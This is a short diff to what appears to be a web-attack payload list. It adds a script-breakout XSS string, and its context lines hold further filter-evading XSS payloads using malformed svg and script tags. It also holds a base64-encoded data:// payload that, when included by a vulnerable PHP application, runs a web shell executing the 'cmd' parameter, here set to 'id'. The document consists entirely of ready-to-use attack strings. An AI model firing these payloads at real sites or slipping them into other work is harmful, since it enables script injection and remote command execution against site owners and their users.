@@ -1,5 +1,6 @@
 
 "onmouseover="alert(1)
+</script><script>alert(1)</script>
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4pJTAw&cmd=id
 <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
 ">"><svg on"><sv">sv<svg onload=(alert)(1)>g onload=(alert)(1)>load=(alert)(1)>
